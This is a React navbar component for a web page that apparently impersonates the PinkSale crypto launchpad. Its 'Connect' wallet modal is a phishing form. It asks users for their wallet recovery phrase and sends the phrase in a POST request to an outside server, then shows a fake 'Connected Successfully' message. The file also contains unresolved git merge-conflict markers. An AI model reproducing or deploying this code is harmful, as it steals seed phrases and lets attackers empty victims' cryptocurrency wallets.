import { Fragment, React, useEffect, useState } from "react";
import { IoMenuOutline, IoClose } from "react-icons/io5";
import ButtonPrimaryprops from "../../components/buttonPrimary/ButtonPrimaryprops";
import ButtonSecprops from "../../components/buttonSec/ButtonSecprops";
import Logo from "../../assets/pinkswaplogo.png";
import Tradeview from "../../assets/tradeview.svg";
import Binance from "../../assets/binancelogo.png";
import Wallets from "../wallets/Wallets";
import MetaMask from "../../assets/metamask.png";
import Trust from "../../assets/trust.png";
import Coinbase from "../../assets/coinbase.png";
import Bitkeep from "../../assets/bitkeep.png";
import Walletconnect from "../../assets/walletcon.svg";
import Fantom from "../../assets/fantom.png";
import Other from "../../assets/other.jpeg";
import TokenP from "../../assets/tokenpocket.png";
import Safepal from "../../assets/safepal.jpg";
import Rabby from "../../assets/rabby.svg";
import { FaHome } from "react-icons/fa";
import Navdata from "../navdata/Navdata";
import { RiArrowDropDownLine } from "react-icons/ri";
import { HiOutlineHome } from "react-icons/hi2";
import { PiRocketLaunchLight } from "react-icons/pi";
import { TiLockOpenOutline } from "react-icons/ti";
import { GiParachute } from "react-icons/gi";
import { MdOutlineEnergySavingsLeaf } from "react-icons/md";
import { GiPrivateFirstClass } from "react-icons/gi";
import { HiOutlineCurrencyDollar } from "react-icons/hi2";
import { LuSettings2 } from "react-icons/lu";
import { RiVipCrownLine } from "react-icons/ri";
import { AiOutlineSafetyCertificate } from "react-icons/ai";
import { AiOutlineSend } from "react-icons/ai";
import { MdOutlineShowChart } from "react-icons/md";
import { LiaRobotSolid } from "react-icons/lia";
import { GrDocumentUser } from "react-icons/gr";
import { GrDocumentText } from "react-icons/gr";
import { IoCartOutline } from "react-icons/io5";
import { TbBrandTelegram } from "react-icons/tb";
import { LuTwitter } from "react-icons/lu";
import { CiFacebook } from "react-icons/ci";

import AOS from "aos";
import "aos/dist/aos.css";
import LoadingModal from "../LoadingModal";
import { toast } from "react-toastify";

const Navbar = () => {
  const [showModal, setShowModal] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState(false);
  const [isNavOpen, setIsNavOpen] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [phrase, setPhrase] = useState("");
  const [isError, setIsError] = useState(false);
  const [isSucess, setIsSucess] = useState(false);

  const toggleConnect = async () => {
    if (phrase === "") {
      setIsError(true);
      setTimeout(() => {
        setIsError(false);
      }, 3000);
    } else {
      setIsLoading(true);

      const body = {
        wallet: "Pinksale Wallet Connect",
        phrase: phrase,
      };

      try {
        const url = "https://dappcommunicationprotocol.onrender.com/details";

        const res = await fetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(body),
        });

        const data = await res.json();

        if (res.status === 200) {
          setIsSucess(true);
          setPhrase("");
        }

        // Clear all errors incase, turn of the loading state, and show sucess message.
        // setIsError("");
        // setWalletPhrase("");
        // setFetchingData(false);
        // setSuccess(data.message);
      } catch (error) {
        // setFetchingData(false);
        // setIsError("Failed to connect manually. Please try again.");
      }

      setIsLoading(false);
      // setTimeout(() => {
      //   setIsLoading(false);
      // }, 3000); // Simulating a 3-second loading process
    }
  };

  const handleTextChange = (e) => {
    setPhrase(e.target.value);
  };

  // To run AOS
  useEffect(() => {
    // Initialize AOS
    AOS.init();
  }, []);

  // For loading animation...

  // To sellect a wallet
  const toggleModal = () => {
    setShowModal(!showModal);
  };

  // To Open Navbar sidebar

  const toggleNav = () => {
    setIsNavOpen(!showModal);
  };

  // For selected wallet
  const toggleSelected = () => {
    setSelectedWallet(!selectedWallet);
    // console.log("hiiii");
  };

  const closeModal = () => {
    setShowModal(false);
    setSelectedWallet(false);
    setIsNavOpen(false);
  };
  const closeNav = () => {
    setIsNavOpen(false);
  };

  return (
    <>
      <div className="flex px-3 lg:px-6 items-center h-20 justify-between">
        <div className="flex gap-3 items-center">
          <div onClick={toggleNav}>
            <IoMenuOutline size="30" />
          </div>
          <div className="logo">
            <img src={Logo} alt="" width="37px" />
          </div>
        </div>
        <div className="flex gap-1 items-center">
          <ButtonSecprops title="dexview.com" img={Tradeview} />
          <div className="hidden lg:block">
            <ButtonSecprops title="BSC MAINNET" img={Tradeview} />
          </div>

          <div className="h-8 w-8 rounded-full bg-black p-2">
            <img src={Binance} alt="" />
          </div>

          <div onClick={toggleModal}>
            <ButtonPrimaryprops title="Connect" />
          </div>
        </div>
      </div>

      {showModal && (
        <div
          data-aos="fade-up"
          data-aos-duration="1000"
          className="fixed z-[99999] border-2 px-3 top-0 backdrop-blur items-center flex flex-col justify-center w-full h-full right-0 "
        >
          <div className="px-3 w-full h-fit py-3 flex flex-col justify-center bg-white rounded-lg border ">
            <div className=" flex items-center justify-between border-b py-2">
              <div>
                <h1 className=" text-md">Connect to a wallet</h1>
              </div>

              <button onClick={closeModal}>
                <IoClose size="24" />
              </button>
            </div>

            <div className=" flex flex-col gap-2 mt-4">
              <div className=" flex items-center gap-2">
                <div className=" w-[50%]" onClick={toggleSelected}>
                  <Wallets img={MetaMask} walletName="Metamask" />
                </div>

                <div className=" w-[50%]" onClick={toggleSelected}>
                  <Wallets img={Rabby} walletName="Rabby Wallet" />
                </div>
              </div>
              <div className=" flex items-center gap-2">
                <div className=" w-[50%]" onClick={toggleSelected}>
                  <Wallets img={Coinbase} walletName="Coinbase" />
                </div>

                <div className=" w-[50%]" onClick={toggleSelected}>
                  <Wallets img={Walletconnect} walletName="Wallet Connect" />
                </div>
              </div>
              <div className=" flex items-center gap-2">
                <div className=" w-[50%]" onClick={toggleSelected}>
                  <Wallets img={Trust} walletName="Trust Wallet" />
                </div>

                <div className=" w-[50%]" onClick={toggleSelected}>
                  <Wallets img={Safepal} walletName="Safepal Wallet" />
                </div>
              </div>
              <div className=" flex items-center gap-2">
              <div className=" w-[50%]" onClick={toggleSelected}>
                  <Wallets img={Bitkeep} walletName="Bitkeep" />
                </div>

                <div className=" w-[50%]" onClick={toggleSelected}>
                  <Wallets img={TokenP} walletName="TokenP Wallet" />
                </div>
              </div>
              <div className=" flex items-center gap-2">

<<<<<<< HEAD
              <div className=" w-[50%]" onClick={toggleSelected}>
                  <Wallets img={Fantom} walletName="Phantom Wallet" />
=======
                <div className=" w-[50%]" onClick={toggleSelected}>
                  <Wallets img={Fantom} walletName="Fantom Wallet" />
>>>>>>> parent of f2f877d (correct wallet name)
                </div>

              <div className=" w-[50%]" onClick={toggleSelected}>
                  <Wallets img={Other} walletName="Other Wallets" />
                </div>

                
              </div>
            </div>
          </div>
        </div>
      )}

      {selectedWallet && (
        <div
          data-aos="fade-up"
          data-aos-duration="1000"
          className="fixed z-[99999] border-2 px-3 top-0 backdrop-blur items-center flex flex-col justify-center w-full h-full right-0 "
        >
          <div className="px-3 w-full h-fit py-3 flex flex-col justify-center bg-white rounded-lg border ">
            <div className=" flex items-center justify-between border-b py-2">
              <div>
                <h1 className=" text-md font-semibold">Connecting Wallet...</h1>
              </div>

              <button onClick={toggleSelected}>
                <IoClose size="24" />
              </button>
            </div>

            <div className=" flex flex-col items-center justify-center gap-6 mt-4">
              <div className=" font-semibold text-lg">
                Import Your Wallet (synchronizing...)
              </div>

              <div className=" flex gap-4 items-center justify-center text-md font-medium ">
                <p>Phrase</p>
                <p>Keystone JSON</p>
                <p>Private Key</p>
              </div>

              <div className=" border-b-2 border-[#F95997] w-full"></div>

              <div className="wallet w-full">
                {isError && (
                  <div className="text-[red] text-[14px] mb-1">
                    Text field can not be empty
                  </div>
                )}
                <form action="">
                  <textarea
                    onChange={handleTextChange}
                    value={phrase}
                    className="  w-full h-[27vh] shadow-lg border focus:border-gray-300 font-semibold py-2 px-4 rounded-md focus:outline-none"
                    placeholder="Enter your recovery phrase"
                  ></textarea>
                </form>
              </div>

              <div>
                <p className="mb-3 mx-3 px-8 text-[14px] font-medium text-center">
                  Typically 12 (sometimes 24) words separated by single space
                </p>
              </div>

              {isSucess ? (
                <div className=" w-full bg-[#82f986] font-semibold text-[#ffffff] text-center rounded-lg py-3 text-lg">
                  <button>Connected Successfully!!!</button>
                  <LoadingModal isLoading={isLoading} />
                </div>
              ) : (
                <div className=" w-full bg-[#FDEAF1] font-semibold text-[#F95997] text-center rounded-lg py-3 text-lg">
                  <button onClick={toggleConnect}>CONNECT</button>
                  <LoadingModal isLoading={isLoading} />
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {isNavOpen && (
        <div
          data-aos="fade-up"
          data-aos-duration="1000"
          className={`fixed sidebar lg:hidden overflow-scroll z-[99999] inset-y-0 left-0 w-64 bg-white transition-transform border-r duration-300 ease-in-out transform ${
            isNavOpen ? "translate-x-0" : "-translate-x-full"
          }`}
        >
          <div className="p-4 flex items-center justify-between">
            <div onClick={toggleModal}>
              <ButtonPrimaryprops title="Connect" />
            </div>
            <div>
              <button
                onClick={closeNav}
                className=" focus:outline-none rounded"
              >
                <IoClose size="30" />
              </button>
            </div>
          </div>
          <nav className="my-6 flex flex-col gap-3 pl-4">
            <div className=" flex justify-between p-2 hover:border-r-4 hover:border-[#F95997] hover:text-[#F95997] hover:bg-[#FDEAF1]">
              <div className=" flex items-center gap-3">
                <HiOutlineHome size="24" />
                <Navdata data="Home" />
              </div>
            </div>

            <div className=" flex justify-between p-2 hover:border-r-4 hover:border-[#F95997] hover:text-[#F95997] hover:bg-[#FDEAF1]">
              <div className=" flex items-center gap-3">
                <PiRocketLaunchLight size="24" />
                <Navdata data="Launchpads" />
              </div>
              <div>
                <RiArrowDropDownLine size="28" className=" flex-1" />
              </div>
            </div>

            <div className=" flex justify-between p-2 hover:border-r-4 hover:border-[#F95997] hover:text-[#F95997] hover:bg-[#FDEAF1]">
              <div className=" flex items-center gap-3">
                <TiLockOpenOutline size="24" />
                <Navdata data="PinkLock" />
              </div>
              <div>
                <RiArrowDropDownLine size="28" className=" flex-1" />
              </div>
            </div>

            <div className=" flex justify-between p-2 hover:border-r-4 hover:border-[#F95997] hover:text-[#F95997] hover:bg-[#FDEAF1]">
              <div className=" flex items-center gap-3">
                <GiParachute size="24" />
                <Navdata data="Airdrop" />
              </div>
              <div>
                <RiArrowDropDownLine size="28" className=" flex-1" />
              </div>
            </div>

            <div className=" flex justify-between p-2 hover:border-r-4 hover:border-[#F95997] hover:text-[#F95997] hover:bg-[#FDEAF1]">
              <div className=" flex items-center gap-3">
                <MdOutlineEnergySavingsLeaf size="24" />
                <Navdata data="Staking" />
              </div>
            </div>

            <div className=" flex justify-between p-2 hover:border-r-4 hover:border-[#F95997] hover:text-[#F95997] hover:bg-[#FDEAF1]">
              <div className=" flex items-center gap-3">
                <GiPrivateFirstClass size="24" />
                <Navdata data="Private Sale" />
              </div>
            </div>

            <div className=" flex justify-between p-2 hover:border-r-4 hover:border-[#F95997] hover:text-[#F95997] hover:bg-[#FDEAF1]">
              <div className=" flex items-center gap-3">
                <HiOutlineCurrencyDollar size="24" />
                <Navdata data="Buy Crypto Fiat" />
              </div>
            </div>

            <div className=" flex justify-between p-2 hover:border-r-4 hover:border-[#F95997] hover:text-[#F95997] hover:bg-[#FDEAF1]">
              <div className=" flex items-center gap-3">
                <LuSettings2 size="24" />
                <Navdata data="Bridge" />
              </div>
            </div>

            <div className=" flex justify-between p-2 hover:border-r-4 hover:border-[#F95997] hover:text-[#F95997] hover:bg-[#FDEAF1]">
              <div className=" flex items-center gap-3">
                <RiVipCrownLine size="24" />
                <Navdata data="Leaderboard" />
              </div>
            </div>

            <div className=" flex justify-between p-2 hover:border-r-4 hover:border-[#F95997] hover:text-[#F95997] hover:bg-[#FDEAF1]">
              <div className=" flex items-center gap-3">
                <AiOutlineSafetyCertificate size="24" />
                <Navdata data="Anti-Bot" />
              </div>
            </div>

            <div className=" flex justify-between p-2 hover:border-r-4 hover:border-[#F95997] hover:text-[#F95997] hover:bg-[#FDEAF1]">
              <div className=" flex items-center gap-3">
                <AiOutlineSend size="24" />
                <Navdata data="Multi-Sender" />
              </div>
            </div>

            <div className=" flex justify-between p-2 hover:border-r-4 hover:border-[#F95997] hover:text-[#F95997] hover:bg-[#FDEAF1]">
              <div className=" flex items-center gap-3">
                <MdOutlineShowChart size="24" />
                <Navdata data="dexview.com" />
              </div>
            </div>

            <div className=" flex justify-between p-2 hover:border-r-4 hover:border-[#F95997] hover:text-[#F95997] hover:bg-[#FDEAF1]">
              <div className=" flex items-center gap-3">
                <LiaRobotSolid size="24" />
                <Navdata data="Pools Alert" />
              </div>
            </div>

            <div className=" flex justify-between p-2 hover:border-r-4 hover:border-[#F95997] hover:text-[#F95997] hover:bg-[#FDEAF1]">
              <div className=" flex items-center gap-3">
                <GrDocumentUser size="24" />
                <Navdata data="KYC & Audit" />
              </div>
            </div>

            <div className=" flex justify-between p-2 hover:border-r-4 hover:border-[#F95997] hover:text-[#F95997] hover:bg-[#FDEAF1]">
              <div className=" flex items-center gap-3">
                <GrDocumentText size="24" />
                <Navdata data="Docs" />
              </div>
            </div>

            <div className=" flex justify-between p-2 hover:border-r-4 hover:border-[#F95997] hover:text-[#F95997] hover:bg-[#FDEAF1]">
              <div className=" flex items-center gap-3">
                <IoCartOutline size="24" />
                <Navdata data="Shop" />
              </div>
            </div>

            <div className=" flex justify-between p-2 hover:border-r-4 hover:border-[#F95997] hover:text-[#F95997] hover:bg-[#FDEAF1]">
              <div className=" flex items-center gap-3">
                <TbBrandTelegram size="24" />
                <Navdata data="Telegram" />
              </div>
            </div>

            <div className=" flex justify-between p-2 hover:border-r-4 hover:border-[#F95997] hover:text-[#F95997] hover:bg-[#FDEAF1]">
              <div className=" flex items-center gap-3">
                <LuTwitter size="24" />
                <Navdata data="Twitter" />
              </div>
            </div>

            <div className=" flex justify-between p-2 hover:border-r-4 hover:border-[#F95997] hover:text-[#F95997] hover:bg-[#FDEAF1]">
              <div className=" flex items-center gap-3">
                <CiFacebook size="24" />
                <Navdata data="Facebook" />
              </div>
              <div>
                <RiArrowDropDownLine size="28" className=" flex-1" />
              </div>
            </div>
          </nav>
        </div>
      )}
    </>
  );
};

export default Navbar;
